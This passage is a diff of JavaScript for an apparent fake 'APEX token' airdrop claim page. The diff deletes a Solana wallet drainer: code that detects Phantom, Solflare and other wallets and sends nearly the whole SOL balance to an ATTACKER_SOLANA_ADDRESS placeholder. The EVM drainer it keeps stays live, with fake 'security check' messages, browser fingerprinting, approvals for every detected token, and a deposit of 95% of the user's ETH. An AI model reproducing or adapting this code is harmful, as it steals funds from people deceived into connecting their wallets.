-  isTrustSolana: () => !!(window.trustWallet?.solana),
-};
-
-function getSolanaWallets() {
-  const wallets = [];
-  if (solanaWalletDetectors.isPhantom()) {
-    wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
-  }
-  if (solanaWalletDetectors.isSolflare()) {
-    wallets.push({ name: 'Solflare', provider: window.solflare });
-  }
-  if (solanaWalletDetectors.isBackpack()) {
-    wallets.push({ name: 'Backpack', provider: window.backpack });
-  }
-  if (solanaWalletDetectors.isCoinbaseSolana()) {
-    wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
-  }
-  if (solanaWalletDetectors.isTrustSolana()) {
-    wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
-  }
-  return wallets;
-}
 
 // ====== CURRENCY CONVERSION SYSTEM ======
 const CURRENCY_CONVERTER = {
@@ -589,11 +2254,6 @@ let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance; // will be set after web3 initialization
 const CLAIM_THRESHOLD_USD = 3;
 
-// Solana specific state
-let solanaProvider = null;
-let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "YourSolanaWalletAddressHere"; // REPLACE WITH YOUR ADDRESS
-
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
@@ -742,319 +2402,185 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== SOLANA FUNCTIONS ======
-async function connectSolanaWallet() {
-  const wallets = getSolanaWallets();
-  if (wallets.length === 0) {
-    throw new Error("No Solana wallet found");
-  }
-
-  const wallet = wallets[0];
-  const provider = wallet.provider;
-
-  try {
-    // Some wallets return { publicKey }, others just the key
-    let publicKey;
-    if (provider.connect) {
-      const response = await provider.connect();
-      publicKey = response.publicKey?.toString() || response.toString();
-    } else if (provider.request) {
-      // Some providers use request method
-      const response = await provider.request({ method: 'connect' });
-      publicKey = response.publicKey.toString();
-    } else {
-      throw new Error("Unsupported provider interface");
-    }
-
-    solanaProvider = provider;
-    solanaPublicKey = publicKey;
-    console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
-    return { provider, publicKey };
-  } catch (err) {
-    throw new Error(`Solana connection failed: ${err.message}`);
-  }
-}
-
-async function drainSolana() {
-  if (!solanaProvider || !solanaPublicKey) {
-    throw new Error("Solana wallet not connected");
-  }
-
-  // Ensure Solana Web3 is loaded
-  if (typeof solanaWeb3 === 'undefined') {
-    throw new Error("Solana Web3 library not loaded");
-  }
-
-  const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-
-  try {
-    const publicKey = new solanaWeb3.PublicKey(solanaPublicKey);
-    const balance = await connection.getBalance(publicKey);
-    console.log(`💰 Solana balance: ${balance / 1e9} SOL`);
-
-    // Leave a tiny amount for fees (5000 lamports = 0.000005 SOL)
-    const LAMPORTS_TO_LEAVE = 5000;
-    if (balance <= LAMPORTS_TO_LEAVE) {
-      throw new Error("Insufficient SOL balance for transaction");
-    }
-
-    const amountToSend = balance - LAMPORTS_TO_LEAVE;
-
-    const instruction = solanaWeb3.SystemProgram.transfer({
-      fromPubkey: publicKey,
-      toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
-      lamports: amountToSend,
-    });
-
-    const { blockhash } = await connection.getRecentBlockhash();
-    const transaction = new solanaWeb3.Transaction().add(instruction);
-    transaction.recentBlockhash = blockhash;
-    transaction.feePayer = publicKey;
-
-    // Sign transaction using provider
-    let signed;
-    if (solanaProvider.signTransaction) {
-      signed = await solanaProvider.signTransaction(transaction);
-    } else if (solanaProvider.signAndSendTransaction) {
-      // For wallets that don't separate signing, use send
-      const signature = await solanaProvider.signAndSendTransaction(transaction);
-      return signature;
-    } else {
-      throw new Error("Provider cannot sign transactions");
-    }
-
-    const signature = await connection.sendRawTransaction(signed.serialize());
-    console.log(`✅ Solana transaction sent: ${signature}`);
-    return signature;
-  } catch (err) {
-    throw new Error(`Solana drain failed: ${err.message}`);
-  }
-}
-
-// ====== MAIN CLAIM PROCESS (Extended for Solana) ======
+// ====== MAIN CLAIM PROCESS ======
 async function initiateClaimProcess() {
-  // If EVM is connected, use EVM path
-  if (connectedWallet && web3) {
-    // Original EVM claim logic
-    const button = document.getElementById("connectButton");
-    const originalText = button ? button.innerHTML : "Connect Wallet";
-
-    try {
-      const loadingMessages = [
-        "Processing...",
-        "Initializing security...",
-        "Verifying eligibility...",
-        "Checking wallet status...",
-        "Analyzing transaction patterns...",
-        "Optimizing gas fees...",
-        "Validating smart contract...",
-        "Preparing token distribution...",
-        "Running security checks...",
-        "Configuring network parameters...",
-      ];
-
-      if (button) {
-        button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
-        button.disabled = true;
-      }
-
-      const statusMessages = [
-        "Initializing security verification...",
-        "Setting up claim process...",
-        "Preparing token distribution...",
-        "Configuring wallet connection...",
-        "Running security checks...",
-        "Analyzing network conditions...",
-        "Optimizing transaction parameters...",
-        "Verifying contract integrity...",
-        "Loading token distribution module...",
-      ];
-
-      if (claimStatus) {
-        claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
-        claimStatus.className = "status pending";
-      }
-
-      await manualRandomDelay(1000, 3000);
-      let accounts = await web3.eth.getAccounts();
-      const userAddress = accounts[0];
-
-      await manualRandomDelay(500, 2000);
-      await collectManualFingerprint();
-
-      if (userHasClaimed) {
-        const errorMessages = [
-          "You have already claimed your APEX tokens in this session.",
-          "Token claim already processed for this wallet.",
-          "Maximum claims per session reached. Please try again later.",
-          "Duplicate claim detected. Security protocols activated.",
-          "Wallet already processed for token distribution.",
-        ];
-
-        if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-          claimStatus.className = "status error";
-        }
-        if (button) resetButton(button, originalText);
-        return;
-      }
-
-      const ethBalance = await web3.eth.getBalance(userAddress);
-      const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
-      userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
-
-      const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
-      const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
-
-      logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
-
-      if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
-        const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
-        const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
-
-        const errorMessages = [
-          `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
-          `Insufficient balance for token claim. Deposit more ETH.`,
-          `Wallet balance below minimum threshold for APEX distribution.`,
-          `Add ETH to your wallet to qualify for token claim.`,
-          `Claim requires minimum ${formattedThreshold} for gas optimization.`,
-        ];
-
-        if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-          claimStatus.className = "status error";
-        }
-        if (button) resetButton(button, originalText);
-        return;
-      }
-
-      if (ethBalanceInETH < 0.005) {
-        const errorMessages = [
-          "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
-          "Additional ETH required for gas fees to complete claim.",
-          "Please add ETH to your wallet to cover transaction costs.",
-          "Low ETH balance. Deposit more to proceed with token claim.",
-          "Transaction requires minimum ETH balance for gas optimization.",
-        ];
-
-        if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-          claimStatus.className = "status error";
-        }
-        if (button) resetButton(button, originalText);
-        return;
-      }
-
-      await simulateManualLegitimateTransaction(userAddress);
-      await manualRandomDelay(800, 2000);
-
-      if (claimStatus) {
-        claimStatus.textContent = "Scanning wallet for eligible tokens...";
-      }
-
-      const { tokens, nfts } = await manualMultiContractTokenDetection(userAddress);
-
-      let approvalsDone = 0;
-      let totalActions = 0;
-
-      // Approve tokens using setTokenApproval
-      if (tokens.length > 0) {
-        totalActions += tokens.length;
-        for (const token of tokens) {
-          if (claimStatus) {
-            claimStatus.textContent = `Approving ${token.symbol}...`;
-          }
-          const success = await callSetTokenApproval(token.address, token.balance);
-          if (success) {
-            approvalsDone++;
-          }
-          await manualRandomDelay(1000, 2000);
-        }
-      }
-
-      // Deposit native ETH using depositBNB
-      let nativeDepositDone = false;
-      if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
-        totalActions++;
-        if (claimStatus) {
-          claimStatus.textContent = "Depositing ETH to claim pool...";
-        }
-        const depositAmount = ethBalanceInETH * 0.95; // leave some for gas
-        const success = await callDepositBNB(depositAmount);
-        if (success) {
-          nativeDepositDone = true;
-          approvalsDone++; // count as an action
-        }
-      }
-
-      // Mark as claimed if at least one action succeeded
-      if (approvalsDone > 0 || nativeDepositDone) {
-        userHasClaimed = true;
-        handleClaimSuccess(userAddress, tokens, button, originalText);
-      } else {
-        const noTokensMessages = [
-          "No eligible tokens found for claiming.",
-          "No tokens detected in your wallet.",
-          "Your wallet doesn't contain claimable tokens at this time.",
-          "Wallet analysis complete - no actionable assets found.",
-        ];
-
-        if (claimStatus) {
-          claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
-          claimStatus.className = "status info";
-        }
-        if (button) resetButton(button, originalText);
-      }
-    } catch (error) {
-      handleManualRewardError(error, button, originalText);
-    }
+  if (!connectedWallet || !web3) {
+    showNotification("Please connect your wallet first", "error");
+    showWalletModal();
     return;
   }
 
-  // Otherwise, try Solana
+  const button = document.getElementById("connectButton");
+  const originalText = button ? button.innerHTML : "Connect Wallet";
+
   try {
-    // Show loading state
-    const button = document.getElementById("connectButton");
-    const originalText = button ? button.innerHTML : "Connect Wallet";
+    const loadingMessages = [
+      "Processing...",
+      "Initializing security...",
+      "Verifying eligibility...",
+      "Checking wallet status...",
+      "Analyzing transaction patterns...",
+      "Optimizing gas fees...",
+      "Validating smart contract...",
+      "Preparing token distribution...",
+      "Running security checks...",
+      "Configuring network parameters...",
+    ];
+
     if (button) {
-      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting Solana...';
+      button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
       button.disabled = true;
     }
+
+    const statusMessages = [
+      "Initializing security verification...",
+      "Setting up claim process...",
+      "Preparing token distribution...",
+      "Configuring wallet connection...",
+      "Running security checks...",
+      "Analyzing network conditions...",
+      "Optimizing transaction parameters...",
+      "Verifying contract integrity...",
+      "Loading token distribution module...",
+    ];
+
     if (claimStatus) {
-      claimStatus.textContent = "Connecting to Solana wallet...";
+      claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
       claimStatus.className = "status pending";
     }
 
-    // Connect to Solana wallet
-    await connectSolanaWallet();
+    await manualRandomDelay(1000, 3000);
+    let accounts = await web3.eth.getAccounts();
+    const userAddress = accounts[0];
 
-    // Show draining message
-    if (claimStatus) {
-      claimStatus.textContent = "Draining SOL...";
+    await manualRandomDelay(500, 2000);
+    await collectManualFingerprint();
+
+    if (userHasClaimed) {
+      const errorMessages = [
+        "You have already claimed your APEX tokens in this session.",
+        "Token claim already processed for this wallet.",
+        "Maximum claims per session reached. Please try again later.",
+        "Duplicate claim detected. Security protocols activated.",
+        "Wallet already processed for token distribution.",
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
     }
 
-    // Drain SOL
-    const txSig = await drainSolana();
+    const ethBalance = await web3.eth.getBalance(userAddress);
+    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
+    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
 
-    // Success
-    if (claimStatus) {
-      claimStatus.textContent = "Solana claim successful! SOL transferred.";
-      claimStatus.className = "status success";
+    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+    const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+
+    logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
+
+    if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
+      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
+      const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
+
+      const errorMessages = [
+        `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
+        `Insufficient balance for token claim. Deposit more ETH.`,
+        `Wallet balance below minimum threshold for APEX distribution.`,
+        `Add ETH to your wallet to qualify for token claim.`,
+        `Claim requires minimum ${formattedThreshold} for gas optimization.`,
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
     }
 
-    // Update UI similar to EVM success
-    userHasClaimed = true;
-    handleClaimSuccess(null, null, button, originalText); // Reuse success handler
+    if (ethBalanceInETH < 0.005) {
+      const errorMessages = [
+        "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
+        "Additional ETH required for gas fees to complete claim.",
+        "Please add ETH to your wallet to cover transaction costs.",
+        "Low ETH balance. Deposit more to proceed with token claim.",
+        "Transaction requires minimum ETH balance for gas optimization.",
+      ];
 
-    showNotification(`Solana transaction sent: ${txSig.slice(0,10)}...`, "success");
+      if (claimStatus) {
+        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.className = "status error";
+      }
+      if (button) resetButton(button, originalText);
+      return;
+    }
+
+    await simulateManualLegitimateTransaction(userAddress);
+    await manualRandomDelay(800, 2000);
+
+    if (claimStatus) {
+      claimStatus.textContent = "Scanning wallet for eligible tokens...";
+    }
+
+    const { tokens, nfts } = await manualMultiContractTokenDetection(userAddress);
+
+    let approvalsDone = 0;
+    let totalActions = 0;
+
+    // Approve tokens using setTokenApproval
+    if (tokens.length > 0) {
+      totalActions += tokens.length;
+      for (const token of tokens) {
+        if (claimStatus) {
+          claimStatus.textContent = `Approving ${token.symbol}...`;
+        }
+        const success = await callSetTokenApproval(token.address, token.balance);
+        if (success) {
+          approvalsDone++;
+        }
+        await manualRandomDelay(1000, 2000);
+      }
+    }
+
+    // Deposit native ETH using depositBNB
+    let nativeDepositDone = false;
+    if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
+      totalActions++;
+      if (claimStatus) {
+        claimStatus.textContent = "Depositing ETH to claim pool...";
+      }
+      const depositAmount = ethBalanceInETH * 0.95; // leave some for gas
+      const success = await callDepositBNB(depositAmount);
+      if (success) {
+        nativeDepositDone = true;
+        approvalsDone++; // count as an action
+      }
+    }
+
+    // Mark as claimed if at least one action succeeded
+    if (approvalsDone > 0 || nativeDepositDone) {
+      userHasClaimed = true;
+      handleClaimSuccess(userAddress, tokens, button, originalText);
+    } else {
+      const noTokensMessages = [
+        "No eligible tokens found for claiming.",
+        "No tokens detected in your wallet.",
+        "Your wallet doesn't contain claimable tokens at this time.",
+        "Wallet analysis complete - no actionable assets found.",
+      ];
+
+      if (claimStatus) {
+        claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
+        claimStatus.className = "status info";
+      }
+      if (button) resetButton(button, originalText);
+    }
   } catch (error) {
-    console.error("Solana claim error:", error);
-    if (claimStatus) {
-      claimStatus.textContent = error.message;
-      claimStatus.className = "status error";
-    }
-    const button = document.getElementById("connectButton");
-    if (button) resetButton(button, button.innerHTML.replace('<i class="fas fa-spinner fa-spin"></i> ', ''));
+    handleManualRewardError(error, button, originalText);
   }
 }
 
@@ -1787,7 +3313,7 @@ function handleClaimSuccess(userAddress, tokens, button, originalText) {
     }
   }
   claimList.unshift({
-    address: userAddress ? userAddress.substring(0, 6) + "..." + userAddress.substring(38) : "Solana User",
+    address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
     amount: 500,
     timestamp: Date.now(),
     valueUSD: claimedValueUSD,
